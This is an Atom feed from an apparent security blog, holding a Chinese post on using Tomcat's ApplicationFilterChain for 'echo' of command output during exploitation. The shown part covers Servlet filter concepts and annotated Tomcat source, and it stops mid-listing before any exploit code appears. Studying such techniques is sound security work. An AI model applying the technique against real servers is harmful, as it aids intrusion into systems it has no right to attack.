<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Mi1k7ea</title>
  
  <subtitle>Blog</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://www.mi1k7ea.com/"/>
  <updated>2022-06-14T14:01:03.759Z</updated>
  <id>https://www.mi1k7ea.com/</id>
  
  <author>
    <name>Mi1k7ea</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>浅析利用Tomcat ApplicationFilterChain类实现半通用回显</title>
    <link href="https://www.mi1k7ea.com/2021/10/18/%E6%B5%85%E6%9E%90%E5%88%A9%E7%94%A8Tomcat-ApplicationFilterChain%E7%B1%BB%E5%AE%9E%E7%8E%B0%E5%9B%9E%E6%98%BE/"/>
    <id>https://www.mi1k7ea.com/2021/10/18/浅析利用Tomcat-ApplicationFilterChain类实现回显/</id>
    <published>2021-10-18T06:57:31.000Z</published>
    <updated>2022-06-14T14:01:03.759Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>之前没搞过这种半通用回显方法，学习一下。</p><h2 id="0x01-相关概念"><a href="#0x01-相关概念" class="headerlink" title="0x01 相关概念"></a>0x01 相关概念</h2><h3 id="FilterChain"><a href="#FilterChain" class="headerlink" title="FilterChain"></a>FilterChain</h3><p>Filter即过滤器，是Servlet技术中最实用的技术，主要用于对用户请求进行预处理，也可以对HttpServletResponse进行后处理。Web开发人员通过Filter技术，对Web服务器管理的所有Web资源如JSP、Servlet、静态文件等进行拦截，从而实现一些特殊的功能。例如实现URL级别的权限访问控制、过滤敏感词汇、压缩响应信息等一些高级功能。</p><p>Filter功能：</p><ul><li>在HttpServletRequest到达Servlet之前，拦截客户的HttpServletRequest 。根据需要检查HttpServletRequest，也可以修改HttpServletRequest头和数据。</li><li>在HttpServletResponse到达客户端之前，拦截HttpServletResponse 。根据需要检查HttpServletResponse，也可以修改HttpServletResponse头和数据。</li></ul><p>FilterChain：在一个Web应用中，可以开发编写多个Filter，这些Filter组合起来称之为一个FilterChain。Web服务器根据Filter在web.xml文件中的注册顺序，决定先调用哪个Filter，当第一个Filter的doFilter()方法被调用时，Web服务器会创建一个代表Filter链的FilterChain对象传递给该方法。在doFilter()方法中，开发人员如果调用了FilterChain对象的doFilter()方法，则Web服务器会检查FilterChain对象中是否还有Filter，如果有则调用第2个Filter，如果没有则调用目标Servlet。</p><p>Filter原理图：</p><p><img src="/2021/10/18/浅析利用Tomcat-ApplicationFilterChain类实现回显/1.png" alt=""></p><p>而ApplicationFilterChain类则是FilterChain接口类的实现类。</p><h3 id="ApplicationFilterChain类"><a href="#ApplicationFilterChain类" class="headerlink" title="ApplicationFilterChain类"></a>ApplicationFilterChain类</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>Tomcat中的ApplicationFilterChain类是一个Java Servlet API规范javax.servlet.FilterChain接口类的实现类，用于管理某个请求request的一组过滤器Filter的执行。当针对一个request所定义的一组过滤器Filter处理完该请求后，最后一个doFilter()调用才会执行目标Servlet的service()函数。之后响应对象response会按照相反的顺序依次经过这组Filter处理，最终到达客户端。</p><h4 id="类图"><a href="#类图" class="headerlink" title="类图"></a>类图</h4><p><img src="/2021/10/18/浅析利用Tomcat-ApplicationFilterChain类实现回显/2.png" alt=""></p><h4 id="创建过程"><a href="#创建过程" class="headerlink" title="创建过程"></a>创建过程</h4><p>ApplicationFilterChain类是在StandardWrapperValve类中invoke()方法中调用ApplicationFilterFactory.createFilterChain()方法创建的。StandardWrapperValve是Wrapper的标准阀，用在Pipleline流程中的最后一个valve执行，其中会创建ApplicationFilterChain对象并调用其doFilter()方法来处理请求，这个ApplicationFilterChain包含着配置的与请求相匹配的Filter和Servlet，其doFilter()方法会依次调用所有的Filter的doFilter()方法和Servlet的service()方法。</p><p>这里可看源码注释分析：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">invoke</span><span class="params">(Request request, Response response)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化本地变量</span></span><br><span class="line">    <span class="keyword">boolean</span> unavailable = <span class="keyword">false</span>;</span><br><span class="line">    Throwable throwable = <span class="keyword">null</span>;</span><br><span class="line">    <span class="comment">// This should be a Request attribute...</span></span><br><span class="line">    <span class="keyword">long</span> t1=System.currentTimeMillis();</span><br><span class="line">    requestCount.incrementAndGet();</span><br><span class="line">    <span class="comment">// 获取StandardWrapper Container</span></span><br><span class="line">    StandardWrapper wrapper = (StandardWrapper) getContainer();</span><br><span class="line">    Servlet servlet = <span class="keyword">null</span>;</span><br><span class="line">    Context context = (Context) wrapper.getParent();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查标记为不可用的应用程序</span></span><br><span class="line">    <span class="keyword">if</span> (!context.getState().isAvailable()) &#123;</span><br><span class="line">        response.sendError(HttpServletResponse.SC_SERVICE_UNAVAILABLE,</span><br><span class="line">                       sm.getString(<span class="string">"standardContext.isUnavailable"</span>));</span><br><span class="line">        unavailable = <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查标记为不可用的servlet</span></span><br><span class="line">    <span class="keyword">if</span> (!unavailable &amp;&amp; wrapper.isUnavailable()) &#123;</span><br><span class="line">        container.getLogger().info(sm.getString(<span class="string">"standardWrapper.isUnavailable"</span>,</span><br><span class="line">                wrapper.getName()));</span><br><span class="line">        <span class="keyword">long</span> available = wrapper.getAvailable();</span><br><span class="line">        <span class="keyword">if</span> ((available &gt; <span class="number">0L</span>) &amp;&amp; (available &lt; Long.MAX_VALUE)) &#123;</span><br><span class="line">            response.setDateHeader(<span class="string">"Retry-After"</span>, available);</span><br><span class="line">            response.sendError(HttpServletResponse.SC_SERVICE_UNAVAILABLE,</span><br><span class="line">                    sm.getString(<span class="string">"standardWrapper.isUnavailable"</span>,</span><br><span class="line">                            wrapper.getName()));</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (available == Long.MAX_VALUE) &#123;</span><br><span class="line">            response.sendError(HttpServletResponse.SC_NOT_FOUND,</span><br><span class="line">                    sm.getString(<span class="string">"standardWrapper.notFound"</span>,</span><br><span class="line">                            wrapper.getName()));</span><br><span class="line">        &#125;</span><br><span class="line">        unavailable = <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 分配一个servlet实例来处理此请求</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!unavailable) &#123;</span><br><span class="line">            <span class="comment">// 通过Wrapper获取Servlet实例，内部已经调用了service(request, response)方法，对req与res进行了字段赋值</span></span><br><span class="line">            <span class="comment">// 下面是对Response和Request进行后续的处理</span></span><br><span class="line">            servlet = wrapper.allocate();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (UnavailableException e) &#123;</span><br><span class="line">        container.getLogger().error(</span><br><span class="line">                sm.getString(<span class="string">"standardWrapper.allocateException"</span>,</span><br><span class="line">                        wrapper.getName()), e);</span><br><span class="line">        <span class="keyword">long</span> available = wrapper.getAvailable();</span><br><span class="line">        <span class="keyword">if</span> ((available &gt; <span class="number">0L</span>) &amp;&amp; (available &lt; Long.MAX_VALUE)) &#123;</span><br><span class="line">            response.setDateHeader(<span class="string">"Retry-After"</span>, available);</span><br><span class="line">            response.sendError(HttpServletResponse.SC_SERVICE_UNAVAILABLE,</span><br><span class="line">                       sm.getString(<span class="string">"standardWrapper.isUnavailable"</span>,</span><br><span class="line">                                    wrapper.getName()));</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (available == Long.MAX_VALUE) &#123;</span><br><span class="line">            response.sendError(HttpServletResponse.SC_NOT_FOUND,</span><br><span class="line">                       sm.getString(<span class="string">"standardWrapper.notFound"</span>,</span><br><span class="line">                                    wrapper.getName()));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ServletException e) &#123;</span><br><span class="line">        container.getLogger().error(sm.getString(<span class="string">"standardWrapper.allocateException"</span>,</span><br><span class="line">                         wrapper.getName()), StandardWrapper.getRootCause(e));</span><br><span class="line">        throwable = e;</span><br><span class="line">        exception(request, response, e);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">        ExceptionUtils.handleThrowable(e);</span><br><span class="line">        container.getLogger().error(sm.getString(<span class="string">"standardWrapper.allocateException"</span>,</span><br><span class="line">                         wrapper.getName()), e);</span><br><span class="line">        throwable = e;</span><br><span class="line">        exception(request, response, e);</span><br><span class="line">        servlet = <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置请求相关属性</span></span><br><span class="line">    MessageBytes requestPathMB = request.getRequestPathMB();</span><br><span class="line">    DispatcherType dispatcherType = DispatcherType.REQUEST;</span><br><span class="line">    <span class="keyword">if</span> (request.getDispatcherType()==DispatcherType.ASYNC) dispatcherType = DispatcherType.ASYNC;</span><br><span class="line">    request.setAttribute(Globals.DISPATCHER_TYPE_ATTR,dispatcherType);</span><br><span class="line">    request.setAttribute(Globals.DISPATCHER_REQUEST_PATH_ATTR,</span><br><span class="line">            requestPathMB);</span><br><span class="line">    <span class="comment">// 新建ApplicationFilterChain实例</span></span><br><span class="line">    ApplicationFilterChain filterChain =</span><br><span class="line">            ApplicationFilterFactory.createFilterChain(request, wrapper, servlet);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用本次请求的filter chain</span></span><br><span class="line">    <span class="comment">// 注意：这里在会调用Servlet的service()函数</span></span><br><span class="line">    Container container = <span class="keyword">this</span>.container;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> ((servlet != <span class="keyword">null</span>) &amp;&amp; (filterChain != <span class="keyword">null</span>)) &#123;</span><br><span class="line">            <span class="comment">// Swallow output if needed</span></span><br><span class="line">            <span class="keyword">if</span> (context.getSwallowOutput()) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    SystemLogHandler.startCapture();</span><br><span class="line">                    <span class="keyword">if</span> (request.isAsyncDispatching()) &#123;</span><br><span class="line">                        request.getAsyncContextInternal().doInternalDispatch();</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        filterChain.doFilter(request.getRequest(),</span><br><span class="line">                                response.getResponse());</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    String log = SystemLogHandler.stopCapture();</span><br><span class="line">                    <span class="keyword">if</span> (log != <span class="keyword">null</span> &amp;&amp; log.length() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                        context.getLogger().info(log);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (request.isAsyncDispatching()) &#123;</span><br><span class="line">                    request.getAsyncContextInternal().doInternalDispatch();</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">// 调用ApplicationFilterChain实例的doFilter()函数</span></span><br><span class="line">                    <span class="comment">// 其中执行完最后一个doFilter()后会执行Servlet的service()函数</span></span><br><span class="line">                    filterChain.doFilter</span><br><span class="line">                        (request.getRequest(), response.getResponse());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClientAbortException | CloseNowException e) &#123;</span><br><span class="line">        <span class="keyword">if</span> (container.getLogger().isDebugEnabled()) &#123;</span><br><span class="line">            container.getLogger().debug(sm.getString(</span><br><span class="line">                    <span class="string">"standardWrapper.serviceException"</span>, wrapper.getName(),</span><br><span class="line">                    context.getName()), e);</span><br><span class="line">        &#125;</span><br><span class="line">        throwable = e;</span><br><span class="line">        exception(request, response, e);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        container.getLogger().error(sm.getString(</span><br><span class="line">                <span class="string">"standardWrapper.serviceException"</span>, wrapper.getName(),</span><br><span class="line">                context.getName()), e);</span><br><span class="line">        throwable = e;</span><br><span class="line">        exception(request, response, e);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (UnavailableException e) &#123;</span><br><span class="line">        container.getLogger().error(sm.getString(</span><br><span class="line">                <span class="string">"standardWrapper.serviceException"</span>, wrapper.getName(),</span><br><span class="line">                context.getName()), e);</span><br><span class="line">        <span class="comment">//            throwable = e;</span></span><br><span class="line">        <span class="comment">//            exception(request, response, e);</span></span><br><span class="line">        wrapper.unavailable(e);</span><br><span class="line">        <span class="keyword">long</span> available = wrapper.getAvailable();</span><br><span class="line">        <span class="keyword">if</span> ((available &gt; <span class="number">0L</span>) &amp;&amp; (available &lt; Long.MAX_VALUE)) &#123;</span><br><span class="line">            response.setDateHeader(<span class="string">"Retry-After"</span>, available);</span><br><span class="line">            response.sendError(HttpServletResponse.SC_SERVICE_UNAVAILABLE,</span><br><span class="line">                       sm.getString(<span class="string">"standardWrapper.isUnavailable"</span>,</span><br><span class="line">                                    wrapper.getName()));</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (available == Long.MAX_VALUE) &#123;</span><br><span class="line">            response.sendError(HttpServletResponse.SC_NOT_FOUND,</span><br><span class="line">                        sm.getString(<span class="string">"standardWrapper.notFound"</span>,</span><br><span class="line">                                    wrapper.getName()));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Do not save exception in 'throwable', because we</span></span><br><span class="line">        <span class="comment">// do not want to do exception(request, response, e) processing</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> (ServletException e) &#123;</span><br><span class="line">        Throwable rootCause = StandardWrapper.getRootCause(e);</span><br><span class="line">        <span class="keyword">if</span> (!(rootCause <span class="keyword">instanceof</span> ClientAbortException)) &#123;</span><br><span class="line">            container.getLogger().error(sm.getString(</span><br><span class="line">                    <span class="string">"standardWrapper.serviceExceptionRoot"</span>,</span><br><span class="line">                    wrapper.getName(), context.getName(), e.getMessage()),</span><br><span class="line">                    rootCause);</span><br><span class="line">        &#125;</span><br><span class="line">        throwable = e;</span><br><span class="line">        exception(request, response, e);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">        ExceptionUtils.handleThrowable(e);</span><br><span class="line">        container.getLogger().error(sm.getString(</span><br><span class="line">                <span class="string">"standardWrapper.serviceException"</span>, wrapper.getName(),</span><br><span class="line">                context.getName()), e);</span><br><span class="line">        throwable = e;</span><br><span class="line">        exception(request, response, e);</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="comment">// 释放本次请求的filter chain</span></span><br><span class="line">        <span class="keyword">if</span> (filterChain != <span class="keyword">null</span>) &#123;</span><br><span class="line">            filterChain.release();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 释放servlet实例</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (servlet != <span class="keyword">null</span>) &#123;</span><br><span class="line">                wrapper.deallocate(servlet);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">            ExceptionUtils.handleThrowable(e);</span><br><span class="line">            container.getLogger().error(sm.getString(<span class="string">"standardWrapper.deallocateException"</span>,</span><br><span class="line">                             wrapper.getName()), e);</span><br><span class="line">            <span class="keyword">if</span> (throwable == <span class="keyword">null</span>) &#123;</span><br><span class="line">                throwable = e;</span><br><span class="line">                exception(request, response, e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// If this servlet has been marked permanently unavailable,</span></span><br><span class="line">        <span class="comment">// unload it and release this instance</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> ((servlet != <span class="keyword">null</span>) &amp;&amp;</span><br><span class="line">                (wrapper.getAvailable() == Long.MAX_VALUE)) &#123;</span><br><span class="line">                wrapper.unload();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">            ExceptionUtils.handleThrowable(e);</span><br><span class="line">            container.getLogger().error(sm.getString(<span class="string">"standardWrapper.unloadException"</span>,</span><br><span class="line">                             wrapper.getName()), e);</span><br><span class="line">            <span class="keyword">if</span> (throwable == <span class="keyword">null</span>) &#123;</span><br><span class="line">                exception(request, response, e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">long</span> t2=System.currentTimeMillis();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">long</span> time=t2-t1;</span><br><span class="line">        processingTime += time;</span><br><span class="line">        <span class="keyword">if</span>( time &gt; maxTime) maxTime=time;</span><br><span class="line">        <span class="keyword">if</span>( time &lt; minTime) minTime=time;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进看下ApplicationFilterFactory类的createFilterChain()函数的具体实现：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> ApplicationFilterChain <span class="title">createFilterChain</span><span class="params">(ServletRequest request,</span></span></span><br><span class="line"><span class="function"><span class="params">        Wrapper wrapper, Servlet servlet)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果没有servlet执行，则直接返回null</span></span><br><span class="line">    <span class="keyword">if</span> (servlet == <span class="keyword">null</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建并初始化一个ApplicationFilterChain对象</span></span><br><span class="line">    ApplicationFilterChain filterChain = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (request <span class="keyword">instanceof</span> Request) &#123;</span><br><span class="line">        Request req = (Request) request;</span><br><span class="line">        <span class="keyword">if</span> (Globals.IS_SECURITY_ENABLED) &#123;</span><br><span class="line">            <span class="comment">// Security: Do not recycle</span></span><br><span class="line">            filterChain = <span class="keyword">new</span> ApplicationFilterChain();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 从请求中尝试获取FilterChain</span></span><br><span class="line">            filterChain = (ApplicationFilterChain) req.getFilterChain();</span><br><span class="line">            <span class="comment">// 如果获取不到，则新建ApplicationFilterChain实例并设置到请求中</span></span><br><span class="line">            <span class="keyword">if</span> (filterChain == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="comment">// 新建ApplicationFilterChain实例时，会先调用其静态代码来</span></span><br><span class="line">                <span class="comment">// 初始化lastServicedRequest和lastServicedResponse为null</span></span><br><span class="line">                filterChain = <span class="keyword">new</span> ApplicationFilterChain();</span><br><span class="line">                req.setFilterChain(filterChain);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 用于请求分发器的场景</span></span><br><span class="line">        filterChain = <span class="keyword">new</span> ApplicationFilterChain();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 为ApplicationFilterChain对象设置Servlet</span></span><br><span class="line">    filterChain.setServlet(servlet);</span><br><span class="line">    filterChain.setServletSupportsAsync(wrapper.isAsyncSupported());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取当前上下文的过滤器映射关系</span></span><br><span class="line">    StandardContext context = (StandardContext) wrapper.getParent();</span><br><span class="line">    FilterMap filterMaps[] = context.findFilterMaps();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果没有映射关系则直接返回</span></span><br><span class="line">    <span class="keyword">if</span> ((filterMaps == <span class="keyword">null</span>) || (filterMaps.length == <span class="number">0</span>))</span><br><span class="line">        <span class="keyword">return</span> filterChain;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取匹配过滤器映射关系所需的信息</span></span><br><span class="line">    DispatcherType dispatcher =</span><br><span class="line">            (DispatcherType) request.getAttribute(Globals.DISPATCHER_TYPE_ATTR);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取请求路径信息</span></span><br><span class="line">    String requestPath = <span class="keyword">null</span>;</span><br><span class="line">    Object attribute = request.getAttribute(Globals.DISPATCHER_REQUEST_PATH_ATTR);</span><br><span class="line">    <span class="keyword">if</span> (attribute != <span class="keyword">null</span>)&#123;</span><br><span class="line">        requestPath = attribute.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    String servletName = wrapper.getName();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将相关请求路径映射到的过滤器添加到ApplicationFilterConfig对象中</span></span><br><span class="line">    <span class="keyword">for</span> (FilterMap filterMap : filterMaps) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!matchDispatcher(filterMap, dispatcher)) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!matchFiltersURL(filterMap, requestPath))</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig)</span><br><span class="line">                context.findFilterConfig(filterMap.getFilterName());</span><br><span class="line">        <span class="keyword">if</span> (filterConfig == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">// FIXME - log configuration problem</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        filterChain.addFilter(filterConfig);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 接着添加与Servlet名称匹配的过滤器</span></span><br><span class="line">    <span class="keyword">for</span> (FilterMap filterMap : filterMaps) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!matchDispatcher(filterMap, dispatcher)) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!matchFiltersServlet(filterMap, servletName))</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig)</span><br><span class="line">                context.findFilterConfig(filterMap.getFilterName());</span><br><span class="line">        <span class="keyword">if</span> (filterConfig == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">// FIXME - log configuration problem</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        filterChain.addFilter(filterConfig);</span><br><span class="line">    &#125;</span><br><span 